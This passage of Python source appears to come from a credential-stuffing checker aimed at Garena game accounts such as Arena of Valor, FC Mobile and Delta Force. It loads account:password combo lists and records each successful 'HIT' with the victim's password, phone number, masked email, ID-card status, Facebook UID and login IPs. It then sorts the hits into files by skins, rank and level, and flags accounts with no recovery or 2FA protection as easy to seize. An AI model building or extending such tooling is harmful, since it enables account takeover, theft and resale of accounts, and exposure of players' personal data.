        "AU": "AUSTRALIA",
        "AT": "AUSTRIA",
        "AZ": "AZERBAIJAN",
        "BS": "BAHAMAS",
        "BH": "BAHRAIN",
        "BD": "BANGLADESH",
        "BB": "BARBADOS",
        "BY": "BELARUS",
        "BE": "BELGIUM",
        "BZ": "BELIZE",
        "BJ": "BENIN",
        "BM": "BERMUDA",
        "BT": "BHUTAN",
        "BO": "BOLIVIA, PLURINATIONAL STATE OF",
        "BQ": "BONAIRE, SINT EUSTATIUS AND SABA",
        "BA": "BOSNIA AND HERZEGOVINA",
        "BW": "BOTSWANA",
        "BV": "BOUVET ISLAND",
        "BR": "BRAZIL",
        "IO": "BRITISH INDIAN OCEAN TERRITORY",
        "BN": "BRUNEI DARUSSALAM",
        "BG": "BULGARIA",
        "BF": "BURKINA FASO",
        "BI": "BURUNDI",
        "KH": "CAMBODIA",
        "CM": "CAMEROON",
        "CA": "CANADA",
        "CV": "CAPE VERDE",
        "KY": "CAYMAN ISLANDS",
        "CF": "CENTRAL AFRICAN REPUBLIC",
        "TD": "CHAD",
        "CL": "CHILE",
        "CN": "CHINA",
        "CX": "CHRISTMAS ISLAND",
        "CC": "COCOS (KEELING) ISLANDS",
        "CO": "COLOMBIA",
        "KM": "COMOROS",
        "CG": "CONGO",
        "CD": "CONGO, THE DEMOCRATIC REPUBLIC OF THE",
        "CK": "COOK ISLANDS",
        "CR": "COSTA RICA",
        "HR": "CROATIA",
        "CU": "CUBA",
        "CW": "CURAÇAO",
        "CY": "CYPRUS",
        "CZ": "CZECH REPUBLIC",
        "DK": "DENMARK",
        "DJ": "DJIBOUTI",
        "DM": "DOMINICA",
        "DO": "DOMINICAN REPUBLIC",
        "EC": "ECUADOR",
        "EG": "EGYPT",
        "SV": "EL SALVADOR",
        "GQ": "EQUATORIAL GUINEA",
        "ER": "ERITREA",
        "EE": "ESTONIA",
        "ET": "ETHIOPIA",
        "FK": "FALKLAND ISLANDS (MALVINAS)",
        "FO": "FAROE ISLANDS",
        "FJ": "FIJI",
        "FI": "FINLAND",
        "FR": "FRANCE",
        "GF": "FRENCH GUIANA",
        "PF": "FRENCH POLYNESIA",
        "TF": "FRENCH SOUTHERN TERRITORIES",
        "GA": "GABON",
        "GM": "GAMBIA",
        "GE": "GEORGIA",
        "DE": "GERMANY",
        "GH": "GHANA",
        "GI": "GIBRALTAR",
        "GR": "GREECE",
        "GL": "GREENLAND",
        "GD": "GRENADA",
        "GP": "GUADELOUPE",
        "GU": "GUAM",
        "GT": "GUATEMALA",
        "GG": "GUERNSEY",
        "GN": "GUINEA",
        "GW": "GUINEA-BISSAU",
        "GY": "GUYANA",
        "HT": "HAITI",
        "HM": "HEARD ISLAND AND MCDONALD ISLANDS",
        "VA": "HOLY SEE (VATICAN CITY STATE)",
        "HN": "HONDURAS",
        "HK": "HONG KONG",
        "HU": "HUNGARY",
        "IS": "ICELAND",
        "IN": "INDIA",
        "ID": "INDONESIA",
        "IR": "IRAN, ISLAMIC REPUBLIC OF",
        "IQ": "IRAQ",
        "IE": "IRELAND",
        "IM": "ISLE OF MAN",
        "IL": "ISRAEL",
        "IT": "ITALY",
        "JM": "JAMAICA",
        "JP": "JAPAN",
        "JE": "JERSEY",
        "JO": "JORDAN",
        "KZ": "KAZAKHSTAN",
        "KE": "KENYA",
        "KI": "KIRIBATI",
        "KR": "KOREA, REPUBLIC OF",
        "KW": "KUWAIT",
        "KG": "KYRGYZSTAN",
        "LV": "LATVIA",
        "LB": "LEBANON",
        "LS": "LESOTHO",
        "LR": "LIBERIA",
        "LY": "LIBYA",
        "LI": "LIECHTENSTEIN",
        "LT": "LITHUANIA",
        "LU": "LUXEMBOURG",
        "MO": "MACAO",
        "MK": "MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF",
        "MG": "MADAGASCAR",
        "MW": "MALAWI",
        "MY": "MALAYSIA",
        "MV": "MALDIVES",
        "ML": "MALI",
        "MT": "MALTA",
        "MH": "MARSHALL ISLANDS",
        "MQ": "MARTINIQUE",
        "MR": "MAURITANIA",
        "MU": "MAURITIUS",
        "YT": "MAYOTTE",
        "MX": "MEXICO",
        "FM": "MICRONESIA, FEDERATED STATES OF",
        "MD": "MOLDOVA, REPUBLIC OF",
        "MC": "MONACO",
        "MN": "MONGOLIA",
        "ME": "MONTENEGRO",
        "MS": "MONTSERRAT",
        "MA": "MOROCCO",
        "MZ": "MOZAMBIQUE",
        "MM": "MYANMAR",
        "NA": "NAMIBIA",
        "NR": "NAURU",
        "NP": "NEPAL",
        "NL": "NETHERLANDS",
        "NC": "NEW CALEDONIA",
        "NZ": "NEW ZEALAND",
        "NI": "NICARAGUA",
        "NE": "NIGER",
        "NG": "NIGERIA",
        "NU": "NIUE",
        "NF": "NORFOLK ISLAND",
        "MP": "NORTHERN MARIANA ISLANDS",
        "NO": "NORWAY",
        "OM": "OMAN",
        "PK": "PAKISTAN",
        "PW": "PALAU",
        "PS": "PALESTINE, STATE OF",
        "PA": "PANAMA",
        "PG": "PAPUA NEW GUINEA",
        "PY": "PARAGUAY",
        "PE": "PERU",
        "PH": "PHILIPPINES",
        "PN": "PITCAIRN",
        "PL": "POLAND",
        "PT": "PORTUGAL",
        "PR": "PUERTO RICO",
        "QA": "QATAR",
        "RE": "RÉUNION",
        "RO": "ROMANIA",
        "RU": "RUSSIAN FEDERATION",
        "RW": "RWANDA",
        "BL": "SAINT BARTHÉLEMY",
        "SH": "SAINT HELENA, ASCENSION AND TRISTAN DA CUNHA",
        "KN": "SAINT KITTS AND NEVIS",
        "LC": "SAINT LUCIA",
        "MF": "SAINT MARTIN (FRENCH PART)",
        "PM": "SAINT PIERRE AND MIQUELON",
        "VC": "SAINT VINCENT AND THE GRENADINES",
        "WS": "SAMOA",
        "SM": "SAN MARINO",
        "ST": "SAO TOME AND PRINCIPE",
        "SA": "SAUDI ARABIA",
        "SN": "SENEGAL",
        "RS": "SERBIA",
        "SC": "SEYCHELLES",
        "SL": "SIERRA LEONE",
        "SG": "SINGAPORE",
        "SX": "SINT MAARTEN (DUTCH PART)",
        "SK": "SLOVAKIA",
        "SI": "SLOVENIA",
        "SB": "SOLOMON ISLANDS",
        "SO": "SOMALIA",
        "ZA": "SOUTH AFRICA",
        "GS": "SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS",
        "SS": "SOUTH SUDAN",
        "ES": "SPAIN",
        "LK": "SRI LANKA",
        "SD": "SUDAN",
        "SR": "SURINAME",
        "SJ": "SVALBARD AND JAN MAYEN",
        "SZ": "SWAZILAND",
        "SE": "SWEDEN",
        "CH": "SWITZERLAND",
        "SY": "SYRIAN ARAB REPUBLIC",
        "TW": "TAIWAN, PROVINCE OF CHINA",
        "TJ": "TAJIKISTAN",
        "TZ": "TANZANIA, UNITED REPUBLIC OF",
        "TH": "THAILAND",
        "TL": "TIMOR-LESTE",
        "TG": "TOGO",
        "TK": "TOKELAU",
        "TO": "TONGA",
        "TT": "TRINIDAD AND TOBAGO",
        "TN": "TUNISIA",
        "TR": "TURKEY",
        "TM": "TURKMENISTAN",
        "TC": "TURKS AND CAICOS ISLANDS",
        "TV": "TUVALU",
        "UG": "UGANDA",
        "UA": "UKRAINE",
        "AE": "UNITED ARAB EMIRATES",
        "GB": "UNITED KINGDOM",
        "US": "UNITED STATES",
        "UM": "UNITED STATES MINOR OUTLYING ISLANDS",
        "UY": "URUGUAY",
        "UZ": "UZBEKISTAN",
        "VU": "VANUATU",
        "VE": "VENEZUELA, BOLIVARIAN REPUBLIC OF",
        "VN": "VIET NAM",
        "VG": "VIRGIN ISLANDS, BRITISH",
        "VI": "VIRGIN ISLANDS, U.S.",
        "WF": "WALLIS AND FUTUNA",
        "EH": "WESTERN SAHARA",
        "YE": "YEMEN",
        "ZM": "ZAMBIA",
        "ZW": "ZIMBABWE",
        "84": "VIETNAM",
        "63": "PHILIPPINES",
        "66": "THAILAND",
        "62": "INDONESIA",
        "65": "SINGAPORE",
        "60": "MALAYSIA",
        "886": "TAIWAN",
        "91": "INDIA",
        "95": "MYANMAR",
        "855": "CAMBODIA",
        "856": "LAOS",
    }

    return mapping.get(code, code)

def _format_rank(rank: str) -> str:
    if not rank:
        return ""
    s = str(rank).strip()
    low = s.lower()
    low = re.sub(r"\s+", " ", low).strip()
    def _tail(src, pattern):
        t = re.sub(pattern, "", src).strip()
        t = re.sub(r"\s+", " ", t).strip()
        return t.upper()
    if "kim cương" in low or "kim cuong" in low or re.search(r"\bk\s*\.\s*c(?:uong|ương)\b", low):
        return ("K.Cương " + _tail(low, r"kim\s*c(?:uong|ương)|k\s*\.\s*c(?:uong|ương)")).strip()
    if "tinh anh" in low or "tinh_anh" in low or "tinh-anh" in low or "tinhanh" in low or re.search(r"\bt\s*\.\s*anh\b", low):
        return ("T.Anh " + _tail(low, r"tinh\s*anh|tinh_anh|tinh-anh|tinhanh|t\s*\.\s*anh")).strip()
    if "cao thủ" in low or "cao thu" in low:
        return ("Cao Thủ " + _tail(low, r"cao\s*thủ|cao\s*thu")).strip()
    if "thách đấu" in low or "thach dau" in low:
        return ("Thách Đấu " + _tail(low, r"thách\s*đấu|thach\s*dau")).strip()
    if "chiến tướng" in low or "chien tuong" in low:
        return ("Chiến Tướng " + _tail(low, r"chiến\s*tướng|chien\s*tuong")).strip()
    if "bạch kim" in low or "bach kim" in low:
        return ("B.Kim " + _tail(low, r"bạch\s*kim|bach\s*kim")).strip()
    if "bac" in low or "bạc" in low:
        return ("Bạc " + _tail(low, r"bạc|bac")).strip()
    if "vàng" in low or "vang" in low:
        return ("Vàng " + _tail(low, r"vàng|vang")).strip()
    if "đồng" in low or "dong" in low:
        return ("Đồng " + _tail(low, r"đồng|dong")).strip()
    return s

def _rank_display(rank: str, stars: int = 0) -> str:
    """Format rank string with ★ symbols. Used in both hit box and hit.txt."""
    if not rank:
        return rank
    disp = _format_rank(rank)
    if stars:
        low_r = disp.lower()
        if 'cao th' in low_r or 'chiến tướng' in low_r or 'chien tuong' in low_r:
            return f"{disp} (★{stars})"
        return f"{disp} {'★' * min(stars, 5)}"
    _div_map = [(' IV', ' ★★★★'), (' III', ' ★★★'), (' II', ' ★★'), (' I', ' ★')]
    disp_up = disp.upper()
    for roman, sym in _div_map:
        if disp_up.endswith(roman):
            return disp[:-len(roman)] + sym
    return disp


def _extract_master_stars(rank_raw: str) -> int:
    """Lấy số sao Cao Thủ từ chuỗi rank. Trả về 1-50 nếu là Cao Thủ, 0 nếu không xác định.
    Cao Thủ trong AOV có tới 50 sao trước khi lên Chiến Tướng.
    Hỗ trợ: 'Cao Thủ 6', 'cao thu 12', 'Master 50', 'cao_thu_25', v.v.
    """
    if not rank_raw:
        return 0
    s = str(rank_raw).strip().lower()
    s = unicodedata.normalize("NFKD", s).encode("ascii", "ignore").decode("ascii")
    s = re.sub(r"[_\-]+", " ", s)
    # Chỉ áp dụng với Cao Thủ (master)
    if not re.search(r"cao\s*thu|\bmaster\b", s):
        return 0
    # Tìm số liền sau tên rank (1-50)
    m = re.search(r"(?:cao\s*thu|master)\s*(\d{1,2})", s)
    if m:
        n = int(m.group(1))
        if 1 <= n <= 50:
            return n
    # Tìm số bất kỳ trong chuỗi (1-50)
    m2 = re.search(r"\b(\d{1,2})\b", s)
    if m2:
        n = int(m2.group(1))
        if 1 <= n <= 50:
            return n
    return 0

# ── Bulk loader ───────────────────────────────────────────────────────────────
def _format_hit_line(h: dict) -> str:
    """Format a HIT result in old aov.txt style with new fields appended."""
    sk = h.get('aov_skins', {})

    # ── Email ──
    masked_email = h.get('masked_email', '')
    email_v = h.get('email_v', 0)
    has_masked_email = bool(masked_email and masked_email.replace('*', '').replace('@', '').replace('.', ''))
    if has_masked_email:
        ok = bool(h.get('email_verified')) or bool(int(email_v or 0))
        email_str = f"Yes [{masked_email}] ({'ĐÃ XÁC THỰC' if ok else 'CHƯA XÁC THỰC'})"
    elif h.get('email_verified'):
        email_str = 'Yes [ĐÃ XÁC THỰC]'
    else:
        email_str = 'No'

    # ── SĐT ──
    # Uu tien so day du tu prefill, fallback sang masked_phone
    _prefill_phone = (h.get('aov_prefill_mobile') or '').strip() or \
                     (h.get('fcmobile_prefill_mobile') or '').strip()
    masked_phone = h.get('masked_phone', '')
    _best_phone = _prefill_phone or masked_phone
    if _best_phone:
        sdt_str = f'Yes [{_best_phone}]'
    elif h.get('mobile_bound'):
        sdt_str = 'Yes'
    else:
        sdt_str = 'No'

    # ── Pass ──
    pass_str = 'Yes' if h.get('password_set') else 'No'

    # ── FB ──
    _fb_uid_f = (h.get('fb_uid') or '').strip()
    fb_str = f'YES [{_fb_uid_f}]' if h.get('fb_linked') and _fb_uid_f else ('YES' if h.get('fb_linked') else 'NO')

    # ── Ban ──
    ban_raw = h.get('aov_banned', 'NO')
    ban_str = 'YES' if _is_yes(ban_raw) else 'NO'

    # ── CCCD (new) ──
    idcard = h.get('idcard', '')
    if idcard and idcard.replace('*', ''):
        cccd_str = f'Yes [{idcard}]'
    else:
        cccd_str = 'No'

    # ── Authen (new) ──
    auth_en = h.get('authenticator_enable', 0)
    two_step = h.get('two_step_verify', 0)
    if auth_en:
        authen_str = 'Yes'
    elif two_step:
        authen_str = 'Yes (2FA)'
    else:
        authen_str = 'No'

    # Build parts in old format order
    parts = [f"{h['account']}:{h['password']}"]
    parts.append(f"UID={h.get('uid', '')}")
    nick = h.get('nickname', '')
    if nick:
        parts.append(nick)
    reg = (h.get('region', 'VIETNAM') or '').strip()
    if reg.upper() == "VN":
        reg = "VIETNAM"
    parts.append(f"Region={reg if reg else 'VIETNAM'}")
    ctry = (h.get("country") or "").strip()
    if ctry:
        parts.append(f"Country={ctry}")
    parts.append(f"Sò={h.get('shells', 0)}")
    parts.append(f"Email={email_str}")
    parts.append(f"SĐT={sdt_str}")
    parts.append(f"Pass={pass_str}")
    parts.append(f"FB={fb_str}")
    parts.append(f"BAN={ban_str}")

    ll = h.get('last_login', '')
    if ll:
        parts.append(f"Đ.nhập={ll}")

    gc = h.get('garena_created', '')
    if gc:
        parts.append(f"Tạo GR={gc}")

    fb_lt = h.get('fb_link_time', '')
    if fb_lt:
        parts.append(f"FB_Linked={fb_lt}")

    sess_ip = (h.get('last_session_ip') or '').strip()
    if sess_ip:
        sess_cc = (h.get('last_session_country') or '').strip()
        sess_dt = (h.get('last_session_time') or '').strip()
        parts.append(f"GarenaIP={sess_ip}[{sess_cc}] {sess_dt}".strip())

    aov_name = h.get('aov_name', '')
    if aov_name:
        parts.append(f"LQ={aov_name}")

    aov_server = h.get('aov_server', '')
    if aov_server:
        parts.append(f"Server={aov_server}")

    aov_rank = h.get('aov_rank', '')
    _rank_stars = int(h.get('aov_rank_stars') or 0) or _extract_master_stars(aov_rank)
    parts.append(f"Rank={_rank_display(aov_rank, _rank_stars) if aov_rank else 'Chưa có'}")

    aov_lv = h.get('aov_level', 0)
    if aov_lv:
        parts.append(f"Lv={aov_lv}")

    aov_reg = h.get('aov_reg_time', '')
    if aov_reg:
        parts.append(f"Ngày ĐK={aov_reg}")

    parts.append(f"Skin={sk.get('total_skins', 0)}")
    parts.append(f"Tướng={sk.get('total_champs', 0)}")
    parts.append(f"QH={sk.get('cp', 0)}")

    # ── New fields ──
    parts.append(f"CCCD={cccd_str}")
    parts.append(f"Authen={authen_str}")
    aov_prefill = (h.get("aov_prefill_mobile") or "").strip()
    if aov_prefill and "*" not in aov_prefill:
        parts.append(f"LQ_SDT={aov_prefill}")

    # ── RoV TH ──
    rov_name_h = (h.get('rov_name') or '').strip()
    if rov_name_h:
        parts.append(f"RoV={rov_name_h}")
    rov_server_h = (h.get('rov_server') or '').strip()
    if rov_server_h:
        parts.append(f"RoV_Server={rov_server_h}")
    rov_sk_h = h.get('rov_skins') or {}
    if rov_sk_h:
        parts.append(f"RoV_Skin={rov_sk_h.get('total_skins',0)}")
        parts.append(f"RoV_QH={rov_sk_h.get('cp',0)}")
        for tier, lbl in (('sss','SSS'),('ss','SS')):
            cnt = rov_sk_h.get(tier, 0)
            if cnt:
                parts.append(f"RoV_{lbl}({cnt})={', '.join(rov_sk_h.get(f'{tier}_list',[]))}")

    # ── Skin tiers (only when > 0) ──
    ss_cnt = sk.get('ss', 0)
    if ss_cnt:
        parts.append(f"SS({ss_cnt})={', '.join(sk.get('ss_list', []))}")
    sss_cnt = sk.get('sss', 0)
    if sss_cnt:
        parts.append(f"SSS({sss_cnt})={', '.join(sk.get('sss_list', []))}")
    anime_cnt = sk.get('anime', 0)
    if anime_cnt:
        parts.append(f"Anime({anime_cnt})={', '.join(sk.get('anime_list', []))}")
    other_cnt = sk.get('other', 0)
    if other_cnt:
        parts.append(f"Other({other_cnt})={', '.join(sk.get('other_list', []))}")

    # ── Delta Force ──
    df_nick = (h.get('df_nickname') or '').strip()
    if df_nick:
        parts.append(f"DF={df_nick}")
        df_rk = h.get('df_rank', '')
        if df_rk:
            parts.append(f"DF_Rank={df_rk}")
        df_lv = h.get('df_level', 0)
        if df_lv:
            parts.append(f"DF_Lv={df_lv}")
        df_mt = h.get('df_matches', 0)
        if df_mt:
            parts.append(f"DF_Match={df_mt}")

    # ── Security signals ──
    if int(h.get('suspicious', 0) or 0):
        parts.append(f"Suspicious={h['suspicious']}")
    if h.get('init_ip'):
        parts.append(f"InitIP={h['init_ip']}")
    _lhist = h.get('login_history') or []
    if _lhist:
        _lh0 = _lhist[0]
        parts.append(f"LastIP={_lh0.get('ip','')} [{_lh0.get('country','')}] {_lh0.get('game','')} {_lh0.get('time','')}".strip())
    _sops = h.get('sensitive_ops') or []
    if _sops:
        _s0 = _sops[0]
        parts.append(f"SecOp={_s0.get('type','')} {_s0.get('time','')} {_s0.get('ip','')}".strip())

    # ── Tình Trạng ──
    parts.append(f"Tình Trạng={_derive_tinh_trang(h)}")

    return ' | '.join(parts)

def _format_fc_line(h: dict) -> str:
    u = h.get("fcmobile_user") or {}
    if not isinstance(u, dict):
        u = {}
    acc = str(h.get("account", "") or "")
    pw = str(h.get("password", "") or "")
    lv = u.get("level", u.get("lv", h.get("aov_level", 0)))
    ovr = u.get("ovr", "")
    role = u.get("role", 0)
    point = u.get("Point", u.get("point", 0))
    bal = u.get("balance", u.get("Balance", 0))
    r_tcn = u.get("rankTCN", "")
    r_ddc = u.get("rankDDC", "")
    r_dgl = u.get("rankDGL", "")
    token = u.get("token", 0)

    fb_str = "YES" if h.get("fb_linked") else "NO"
    cmnd_str = "YES" if (h.get("idcard") or "").strip().replace("*", "") else "NO"
    mail_ok = bool(h.get("email_verified")) or bool(int(h.get("email_v", 0) or 0))
    masked_email = (h.get("masked_email") or "").strip()
    if masked_email:
        mail_str = f"{masked_email} ({'ĐÃ XÁC THỰC' if mail_ok else 'CHƯA XÁC THỰC'})"
    else:
        mail_str = "YES" if mail_ok else "NO"
    sdt_str = "YES" if bool(h.get("mobile_bound")) else "NO"
    sdt_extra = " (Đổi được)" if sdt_str == "YES" and not (h.get("masked_phone") or "").strip() else ""
    auth_on = bool(int(h.get("authenticator_enable", 0) or 0)) or bool(int(h.get("two_step_verify", 0) or 0))
    auth_str = "BẬT" if auth_on else "TẮT"

    last_topup = h.get("topup_time", 0) or 0
    prefill_mobile = (h.get("fcmobile_prefill_mobile") or "").strip()
    return (
        f"{acc}|{pw}||"
        f"LV: {lv}|OVR: {ovr}|ROLE: {role}|POINT: {point}|BALANCE: {bal}|"
        f"RANK_TCN: {r_tcn}|RANK_DDC: {r_ddc}|RANK_DGL: {r_dgl}|TOKEN: {token}|"
        f"Fb: {fb_str}|CMND: {cmnd_str}|Mail:{mail_str}|SĐT: {sdt_str}{sdt_extra}|"
        f"LS NẠP:{last_topup}|TTAUTHEN:{auth_str}|FC_SDT: {prefill_mobile}"
    )

def load_combos(filepath: str):
    combos = []
    seen = set()
    with open(filepath, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line: continue
            sep = "|" if "|" in line else ":"
            if sep in line:
                p = line.split(sep, 1)
                acc = p[0].strip()
                pw = p[1].strip()
                key = f"{acc}:{pw}"
                if key in seen:
                    continue
                seen.add(key)
                combos.append((acc, pw))
    return combos

def _save(filename: str, line: str, subdir: str = ""):
    base = os.path.join("res", subdir) if subdir else "res"
    os.makedirs(base, exist_ok=True)
    with _save_lock:
        with open(os.path.join(base, filename), "a", encoding="utf-8") as f:
            f.write(line if line.endswith("\n") else line + "\n")

def _save_result(r: dict):
    """Save result into result/ folder based on status and skin tiers."""
    acc_pw = f"{r['account']}:{r['password']}"
    status = r.get("status", "")

    # Bẻ lái toàn bộ logic lưu của nước ngoài để không bị trộn lẫn vào Việt Nam
    is_foreign_aov = bool(r.get('is_th_rov') or r.get('is_tw_aov'))
    foreign_dirname = "AOV_THAILAND" if r.get('is_th_rov') else ("AOV_TAIWAN" if r.get('is_tw_aov') else "")
    _orig_save = globals().get('_save')
    
    def _save(filename: str, line: str, subdir: str = ""):
        if is_foreign_aov:
            if not subdir:
                # Lệnh lưu mặc định (root) sẽ bị bẻ lái sang thư mục riêng của Thái/Đài
                _orig_save(filename, line, subdir=foreign_dirname)
            else:
                # Bỏ qua các khối lệnh lưu kép (đã gắn subdir) để ngăn trùng lặp rác
                pass
        else:
            _orig_save(filename, line, subdir=subdir)

    if status == "HIT":
        hit_line = _format_hit_line(r)

        ctry = (r.get("country") or "").strip().upper() or "UNKNOWN"
        ctry = re.sub(r"[^A-Z0-9_ -]+", "", ctry).strip().replace(" ", "_") or "UNKNOWN"
        subdir = os.path.join("country", ctry)

        tinh_trang = _derive_tinh_trang(r)

        fc_user = r.get("fcmobile_user") or {}
        if isinstance(fc_user, dict) and fc_user.get("uid"):
            fc_line = _format_fc_line(r)
            _save("acc_fc.txt", fc_line)
            if ctry != "UNKNOWN":
                _save("acc_fc.txt", fc_line, subdir=subdir)
            _save(f"{ctry}.txt", fc_line, subdir=os.path.join("acc_fc"))

            mail_ok = bool(r.get("email_verified")) or bool(int(r.get("email_v", 0) or 0))
            cmnd_ok = bool((r.get("idcard") or "").strip().replace("*", ""))
            fb_ok = bool(r.get("fb_linked"))
            auth_on = bool(int(r.get("authenticator_enable", 0) or 0)) or bool(int(r.get("two_step_verify", 0) or 0))
            phone_ok = bool(r.get("mobile_bound"))

            is_fc_trang = (not mail_ok) and (not cmnd_ok) and (not fb_ok) and (not auth_on) and (not phone_ok)
            if is_fc_trang:
                _save("acc_fc_trang_khong_fon.txt", fc_line)
                if ctry != "UNKNOWN":
                    _save("acc_fc_trang_khong_fon.txt", fc_line, subdir=subdir)
                _save(f"{ctry}.txt", fc_line, subdir=os.path.join("acc_fc_trang_khong_fon"))

        # ── Delta Force saving ──
        df_data = r.get('delta_force') or {}
        if df_data.get('df_has_data'):
            df_n = r.get('df_nickname', '') or '?'
            df_lv = r.get('df_level', 0)
            df_rk = r.get('df_rank', '') or '?'
            df_mt = r.get('df_matches', 0)
            df_line = f"{acc_pw} | DF: {df_n} Lv{df_lv} Rank={df_rk} Matches={df_mt}"
            _save("acc_delta_force.txt", df_line)
            if ctry != "UNKNOWN":
                _save("acc_delta_force.txt", df_line, subdir=subdir)
                _save(f"{ctry}.txt", df_line, subdir=os.path.join("acc_delta_force"))

        ban_raw = r.get("aov_banned", "NO")
        is_banned = _is_yes(ban_raw)
        if is_banned:
            if tinh_trang == "Acc Trắng":
                _save("acc_ban_trang.txt", hit_line)
                if ctry != "UNKNOWN":
                    _save("acc_ban_trang.txt", hit_line, subdir=subdir)
            else:
                _save("acc_ban_khong_trang.txt", hit_line)
                if ctry != "UNKNOWN":
                    _save("acc_ban_khong_trang.txt", hit_line, subdir=subdir)
            return

        try:
            aov_lv_all = int(r.get("aov_level", 0) or 0)
        except Exception:
            aov_lv_all = 0
        rank_raw_all = (r.get("aov_rank") or "").strip()
        rank_l_all = rank_raw_all.lower()
        rank_fold_all = unicodedata.normalize("NFKD", rank_l_all).encode("ascii", "ignore").decode("ascii")
        rank_norm_all = re.sub(r"[^a-z0-9\s]", " ", rank_fold_all)
        rank_norm_all = re.sub(r"\s+", " ", rank_norm_all).strip()
        is_dong_all = ("đồng" in rank_l_all) or ("dong" in rank_norm_all) or ("บรอนซ์" in rank_l_all) or ("bronze" in rank_l_all) or ("青銅" in rank_l_all)
        is_bac_all = ("bạc" in rank_l_all) or ("bac" in rank_norm_all) or ("ซิลเวอร์" in rank_l_all) or ("silver" in rank_l_all) or ("白銀" in rank_l_all)
        is_vang_all = ("vàng" in rank_l_all) or ("vang" in rank_norm_all) or ("โกลด์" in rank_l_all) or ("gold" in rank_l_all) or ("黃金" in rank_l_all)
        is_bach_kim_all = ("bạch kim" in rank_l_all) or ("bach kim" in rank_norm_all) or bool(re.search(r"\bb\s*\.\s*kim\b", rank_l_all)) or ("แพลทินัม" in rank_l_all) or ("platinum" in rank_l_all) or ("鉑金" in rank_l_all)
        if aov_lv_all >= 10 and (is_dong_all or is_bac_all or is_vang_all or is_bach_kim_all):
            _save("rank_dong_bac_vang_bach_kim_lv10_plus.txt", hit_line)
            if ctry != "UNKNOWN":
                _save("rank_dong_bac_vang_bach_kim_lv10_plus.txt", hit_line, subdir=subdir)
            _save(f"{ctry}.txt", hit_line, subdir=os.path.join("rank_dong_bac_vang_bach_kim_lv10_plus"))

        if tinh_trang == "Acc Trắng":
            sk_at = r.get("aov_skins") or {}
            try:
                sss_cnt = int(sk_at.get("sss", 0) or 0)
            except Exception:
                sss_cnt = 0
            if sss_cnt >= 1:
                _save("acc_trang_sss_plus.txt", hit_line)
                if ctry != "UNKNOWN":
                    _save("acc_trang_sss_plus.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_sss_plus"))
                return
            try:
                ss_cnt = int(sk_at.get("ss", 0) or 0)
            except Exception:
                ss_cnt = 0
            if ss_cnt >= 1:
                _save("acc_trang_ss_plus.txt", hit_line)
                if ctry != "UNKNOWN":
                    _save("acc_trang_ss_plus.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_ss_plus"))
                return
            try:
                so = int(r.get("shells", 0) or 0)
            except Exception:
                so = 0
            if so > 10:
                _save("acc_trang_so_10_plus.txt", hit_line)
                if ctry != "UNKNOWN":
                    _save("acc_trang_so_10_plus.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_so_10_plus"))
                return
                
            try:
                aov_lv = int(r.get("aov_level", 0) or 0)
            except Exception:
                aov_lv = 0
            if aov_lv >= 30:
                _save("acc_trang_lv30_plus.txt", hit_line)
                if ctry != "UNKNOWN":
                    _save("acc_trang_lv30_plus.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_lv30_plus"))
                return

            if aov_lv >= 15:
                _save("acc_trang_lv15_plus.txt", hit_line)
                if ctry != "UNKNOWN":
                    _save("acc_trang_lv15_plus.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_lv15_plus"))
                return

            rank_raw_at = (r.get("aov_rank") or "").strip()
            rank_l_at = rank_raw_at.lower()
            rank_fold_at = unicodedata.normalize("NFKD", rank_l_at).encode("ascii", "ignore").decode("ascii")
            rank_norm_at = re.sub(r"[^a-z0-9\s]", " ", rank_fold_at)
            rank_norm_at = re.sub(r"\s+", " ", rank_norm_at).strip()

            is_bach_kim_at = ("bạch kim" in rank_l_at) or ("bach kim" in rank_norm_at) or bool(re.search(r"\bb\s*\.\s*kim\b", rank_l_at)) or ("แพลทินัม" in rank_l_at) or ("platinum" in rank_l_at)
            is_kim_cuong_at = ("kim cương" in rank_l_at) or ("kim cuong" in rank_norm_at) or bool(re.search(r"\bk\s*cuong\b", rank_norm_at)) or bool(re.search(r"\bk\s*\.\s*cuong\b", rank_l_at)) or ("ไดมอนด์" in rank_l_at) or ("diamond" in rank_l_at) or ("鑽石" in rank_l_at)
            is_tinh_anh_at = ("tinh anh" in rank_norm_at) or bool(re.search(r"\bt\s*anh\b", rank_norm_at)) or bool(re.search(r"\bt\s*\.\s*anh\b", rank_l_at)) or ("คอมมานเดอร์" in rank_l_at) or ("commander" in rank_l_at) or ("星耀" in rank_l_at)
            is_chien_tuong_at = ("chiến tướng" in rank_l_at) or ("chien tuong" in rank_norm_at) or ("ซูพรีมคอนเควอร์เรอร์" in rank_l_at) or ("supreme conqueror" in rank_l_at) or ("璀璨傳說" in rank_l_at)
            is_chien_than_at = (
                ("chiến thần" in rank_l_at) or ("chien than" in rank_norm_at) or
                ("thách đấu" in rank_l_at) or ("thach dau" in rank_norm_at) or
                ("กลอเรียสรูเลอร์" in rank_l_at) or ("glorious ruler" in rank_l_at)
            )
            is_master_at = (
                ("cao thủ" in rank_l_at) or ("cao thu" in rank_l_at) or
                ("cao thu" in rank_norm_at) or
                bool(re.search(r"\bmaster\b", rank_norm_at)) or
                ("คอนเควอร์เรอร์" in rank_l_at and "ซูพรีม" not in rank_l_at) or
                ("conqueror" in rank_l_at and "supreme" not in rank_l_at) or
                ("戰場傳說" in rank_l_at)
            )

            if is_chien_tuong_at:
                _save("acc_trang_chien_tuong.txt", hit_line)
                if ctry != "UNKNOWN": _save("acc_trang_chien_tuong.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_chien_tuong"))
                return

            if is_chien_than_at:
                _save("acc_trang_chien_than.txt", hit_line)
                if ctry != "UNKNOWN":
                    _save("acc_trang_chien_than.txt", hit_line, subdir=subdir)
                _save(f"{ctry}.txt", hit_line, subdir=os.path.join("acc_trang_chien_than"))
                # Backward compatibility for old file naming.
                _save("acc_trang_thach_dau.txt", hit_line)
                if ctry != "UNKNOWN":
                    _save("acc_trang_thach_dau.txt", hit_line, subdir=subdir)
